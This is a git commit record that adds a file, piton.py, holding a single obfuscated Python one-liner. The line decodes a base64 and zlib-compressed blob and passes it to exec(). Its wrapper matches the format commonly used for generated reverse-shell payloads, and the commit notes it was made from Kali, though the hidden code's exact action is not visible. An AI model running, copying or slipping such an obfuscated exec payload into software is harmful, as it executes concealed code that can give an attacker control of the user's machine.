9466087a195ec2efe51a2c3ed1903612e68171a1
cod3_suck3r <habibgemini1@gmail.com>
2024-04-10 00:15:46 +0100

    committed from kali, first commit

---
+++ piton.py
@@ -0,0 +1,1 @@
+python -c "exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNqNkE8LwjAMxb9K6akF6f4gQxk9DJkgooLbfbha2XAuZem+vx2beOhl75KE/PIepP0YGCxBUG9tyaLNr8GxNgMojeitAEnaAFpJo30somQnklAklKSTn9w6kRTl7CvmwpYpO1ana176afO6uB3OVVHe8+zCnYdQ0PdaWcamOO9oiuOOAxTP0cQMxavtdA+Me2i4DovWYbHDjPx/SKhH1zEa1G0fYEP5F4qMWfk=')[0])))"
